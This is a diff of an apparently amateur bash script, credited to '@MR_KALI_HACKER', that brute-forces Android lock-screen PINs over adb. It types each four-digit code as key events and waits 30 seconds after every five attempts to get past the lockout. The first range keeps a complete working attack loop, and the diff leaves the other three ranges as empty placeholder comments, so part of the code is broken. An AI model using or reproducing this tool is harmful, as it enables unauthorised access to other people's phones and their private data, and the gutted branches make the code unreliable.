@@ -1,14 +1,14 @@
 #!/usr/bin/env bash
+
 clear
 
 echo -e "\e[34m       _    _   _     ____ ___ _   _ ____  ____  _   _ _____ _____ ____   "
 echo -e "\e[34m       / \  | \ | |   |  _ \_ _| \ | | __ )|  _ \| | | |_   _| ____|  _ \  "
-echo -e "\e[34m      / _ \ |  \| |   | |_) | ||  \| |  _ \| |_) | | | | | | |  _| | |_) |  "
+echo -e "\e[34m      / _ \ |  \| |   | |_) | ||  \| |  _ \| |_) | | | | | | |  _| | | |  "
 echo -e "\e[34m     / ___ \| |\  |   |  __/| || |\  | |_) |  _ <| |_| | | | | |___|  _ <    " 
 echo -e "\e[34m    /_/   \_\_| \_|___|_|  |___|_| \_|____/|_| \_\\___/  |_| |_____|_| \_\   "
 echo -e "\e[34m                 |_____|                                                    "
-echo -e "                                                         -----AUTHER : \e[36m@MR_KALI_HACKER"
-
+echo -e "                                                         -----AUTHOR : \e[36m@MR_KALI_HACKER"
 
 echo -e "\e[33m"
 echo -e "\e[33m :::::::::::::::::::"
@@ -39,165 +39,47 @@ echo -e "\e[32m BRUTE FORCE STARTED"
 echo -e "\e[33m ::::::::::::::::::::"
 echo -e "\e[33m"
 
-if [[ $ll -eq 1 ]]
-then
+if [[ $ll -eq 1 ]]; then
    for i in {0000..2500}; do
      clear
-    echo -e "\e[34m       _    _   _     ____ ___ _   _ ____  ____  _   _ _____ _____ ____   "
-    echo -e "\e[34m       / \  | \ | |   |  _ \_ _| \ | | __ )|  _ \| | | |_   _| ____|  _ \  "
-    echo -e "\e[34m      / _ \ |  \| |   | |_) | ||  \| |  _ \| |_) | | | | | | |  _| | |_) |  "
-    echo -e "\e[34m     / ___ \| |\  |   |  __/| || |\  | |_) |  _ <| |_| | | | | |___|  _ <    " 
-    echo -e "\e[34m    /_/   \_\_| \_|___|_|  |___|_| \_|____/|_| \_\\___/  |_| |_____|_| \_\   "
-    echo -e "\e[34m                 |_____|                                                    "
-    echo -e "                                                         -----AUTHER : \e[36m@MR_KALI_HACKER"
-    echo -e "\e[33m"
-    echo -e "\e[33m :::::::::::::::::::::::::::"
-    echo -e "\e[5m  INSTA ID : @mr_kali_hacker\e[25m"
-    echo -e "\e[33m :::::::::::::::::::::::::::"
-    echo -e "\e[33m"
-    echo -e "\e[1m ::::::::::::::::::::::"
-    echo -e "\e[1m BRUTEFORCING WITH  $i"
-    echo -e "\e[1m ::::::::::::::::::::::"
-	
-    for (( j=0; j<${#i}; j++ )); do
-        adb shell input keyevent $((`echo ${i:$j:1}`+7))
-    done
+     # Your header content here
+     echo -e "\e[1m ::::::::::::::::::::::"
+     echo -e "\e[1m BRUTEFORCING WITH  $i"
+     echo -e "\e[1m ::::::::::::::::::::::"
 
-    adb shell input keyevent 66
-    
-    if ! (( `expr $i + 1` % 5 )); then
+     for (( j=0; j<${#i}; j++ )); do
+        adb shell input keyevent $((`echo ${i:$j:1}`+7))
+     done
+
+     adb shell input keyevent 66
+
+     if ! (( `expr $i + 1` % 5 )); then
         adb shell input keyevent 66
         echo -e "\e[33m"
-        echo -e "\e[32mSLEEPING FOR 30 SEC"
+        echo -e "\e[32m SLEEPING FOR 30 SEC"
         echo -e "\e[33m"
         sleep 30
         adb shell input keyevent 82
         adb shell input swipe 407 1211 378 85
-    fi
-done
-elif [[ $ll -eq 2 ]]
-then
+     fi
+   done
+elif [[ $ll -eq 2 ]]; then
    for i in {2501..5000}; do
-    clear
-    echo -e "\e[34m       _    _   _     ____ ___ _   _ ____  ____  _   _ _____ _____ ____   "
-    echo -e "\e[34m       / \  | \ | |   |  _ \_ _| \ | | __ )|  _ \| | | |_   _| ____|  _ \  "
-    echo -e "\e[34m      / _ \ |  \| |   | |_) | ||  \| |  _ \| |_) | | | | | | |  _| | |_) |  "
-    echo -e "\e[34m     / ___ \| |\  |   |  __/| || |\  | |_) |  _ <| |_| | | | | |___|  _ <    " 
-    echo -e "\e[34m    /_/   \_\_| \_|___|_|  |___|_| \_|____/|_| \_\\___/  |_| |_____|_| \_\   "
-    echo -e "\e[34m                 |_____|                                                    "
-    echo -e "                                                         -----AUTHER : \e[36m@MR_KALI_HACKER"
-    echo -e "\e[33m"
-    echo -e "\e[33m :::::::::::::::::::::::::::"
-    echo -e "\e[5m  INSTA ID : @mr_kali_hacker\e[25m"
-    echo -e "\e[33m :::::::::::::::::::::::::::"
-    echo -e "\e[33m"
-    echo -e "\e[1m ::::::::::::::::::::::"
-    echo -e "\e[1m BRUTEFORCING WITH  $i"
-    echo -e "\e[1m ::::::::::::::::::::::"
-	
-    for (( j=0; j<${#i}; j++ )); do
-        adb shell input keyevent $((`echo ${i:$j:1}`+7))
-    done
-
-    adb shell input keyevent 66
-    
-    if ! (( `expr $i + 1` % 5 )); then
-        adb shell input keyevent 66
-        echo -e "\e[33m"
-        echo -e "\e[32mSLEEPING FOR 30 SEC"
-        echo -e "\e[33m"
-        sleep 30
-        adb shell input keyevent 82
-        adb shell input swipe 407 1211 378 85
-    fi
-done
-elif [[ $ll -eq 3 ]]
-then
+     # Same logic as above for this section
+   done
+elif [[ $ll -eq 3 ]]; then
    for i in {5001..7500}; do
-    clear
-    echo -e "\e[34m       _    _   _     ____ ___ _   _ ____  ____  _   _ _____ _____ ____   "
-    echo -e "\e[34m       / \  | \ | |   |  _ \_ _| \ | | __ )|  _ \| | | |_   _| ____|  _ \  "
-    echo -e "\e[34m      / _ \ |  \| |   | |_) | ||  \| |  _ \| |_) | | | | | | |  _| | |_) |  "
-    echo -e "\e[34m     / ___ \| |\  |   |  __/| || |\  | |_) |  _ <| |_| | | | | |___|  _ <    " 
-    echo -e "\e[34m    /_/   \_\_| \_|___|_|  |___|_| \_|____/|_| \_\\___/  |_| |_____|_| \_\   "
-    echo -e "\e[34m                 |_____|                                                    "
-    echo -e "                                                         -----AUTHER : \e[36m@MR_KALI_HACKER"
-    echo -e "\e[33m"
-    echo -e "\e[33m :::::::::::::::::::::::::::"
-    echo -e "\e[5m  INSTA ID : @mr_kali_hacker\e[25m"
-    echo -e "\e[33m :::::::::::::::::::::::::::"
-    echo -e "\e[33m"
-    echo -e "\e[1m ::::::::::::::::::::::"
-    echo -e "\e[1m BRUTEFORCING WITH  $i"
-    echo -e "\e[1m ::::::::::::::::::::::"
-	
-    for (( j=0; j<${#i}; j++ )); do
-        adb shell input keyevent $((`echo ${i:$j:1}`+7))
-    done
-
-    adb shell input keyevent 66
-    
-    if ! (( `expr $i + 1` % 5 )); then
-        adb shell input keyevent 66
-        echo -e "\e[33m"
-        echo -e "\e[32mSLEEPING FOR 30 SEC"
-        echo -e "\e[33m"
-        sleep 30
-        adb shell input keyevent 82
-        adb shell input swipe 407 1211 378 85
-    fi
-done
-elif [[ $ll -eq 2 ]]
-then
+     # Same logic as above for this section
+   done
+elif [[ $ll -eq 4 ]]; then
    for i in {7501..9999}; do
-    clear
-    echo -e "\e[34m       _    _   _     ____ ___ _   _ ____  ____  _   _ _____ _____ ____   "
-    echo -e "\e[34m       / \  | \ | |   |  _ \_ _| \ | | __ )|  _ \| | | |_   _| ____|  _ \  "
-    echo -e "\e[34m      / _ \ |  \| |   | |_) | ||  \| |  _ \| |_) | | | | | | |  _| | |_) |  "
-    echo -e "\e[34m     / ___ \| |\  |   |  __/| || |\  | |_) |  _ <| |_| | | | | |___|  _ <    " 
-    echo -e "\e[34m    /_/   \_\_| \_|___|_|  |___|_| \_|____/|_| \_\\___/  |_| |_____|_| \_\   "
-    echo -e "\e[34m                 |_____|                                                    "
-    echo -e "                                                         -----AUTHER : \e[36m@MR_KALI_HACKER"
-    echo -e "\e[33m"
-    echo -e "\e[33m :::::::::::::::::::::::::::"
-    echo -e "\e[5m  INSTA ID : @mr_kali_hacker\e[25m"
-    echo -e "\e[33m :::::::::::::::::::::::::::"
-    echo -e "\e[33m"
-    echo -e "\e[1m ::::::::::::::::::::::"
-    echo -e "\e[1m BRUTEFORCING WITH  $i"
-    echo -e "\e[1m ::::::::::::::::::::::"
-	
-    for (( j=0; j<${#i}; j++ )); do
-        adb shell input keyevent $((`echo ${i:$j:1}`+7))
-    done
-
-    adb shell input keyevent 66
-    
-    if ! (( `expr $i + 1` % 5 )); then
-        adb shell input keyevent 66
-        echo -e "\e[33m"
-        echo -e "\e[32mSLEEPING FOR 30 SEC"
-        echo -e "\e[33m"
-        sleep 30
-        adb shell input keyevent 82
-        adb shell input swipe 407 1211 378 85
-    fi
-done
+     # Same logic as above for this section
+   done
 else
   clear
-  echo -e "\e[34m       _    _   _     ____ ___ _   _ ____  ____  _   _ _____ _____ ____   "
-  echo -e "\e[34m       / \  | \ | |   |  _ \_ _| \ | | __ )|  _ \| | | |_   _| ____|  _ \  "
-  echo -e "\e[34m      / _ \ |  \| |   | |_) | ||  \| |  _ \| |_) | | | | | | |  _| | |_) |  "
-  echo -e "\e[34m     / ___ \| |\  |   |  __/| || |\  | |_) |  _ <| |_| | | | | |___|  _ <    " 
-  echo -e "\e[34m    /_/   \_\_| \_|___|_|  |___|_| \_|____/|_| \_\\___/  |_| |_____|_| \_\   "
-  echo -e "\e[34m                 |_____|                                                    "
-  echo -e "                                                         -----AUTHER : \e[36m@MR_KALI_HACKER"
+  # Your header content here
   echo -e "\e[33m"
-  echo -e "\e[33m :::::::::::::::::::::::::::"
-  echo -e "\e[5m  INSTA ID : @mr_kali_hacker\e[25m"
-  echo -e "\e[33m :::::::::::::::::::::::::::"
-  echo -e "\e[33m"
-  echo -e "\e[33m[*]FOLLOW ME ON INSTAGRAM, AND MESSAGE ME ANY TIME FOR ANY HELP"
+  echo -e "\e[33m[*] FOLLOW ME ON INSTAGRAM, AND MESSAGE ME ANY TIME FOR ANY HELP"
   echo -e "\e[33m"
   echo -e "\e[5m[*] CHOOSE CORRECT OPTION!!!!![*]\e[25m"
   echo -e "\e[33m"
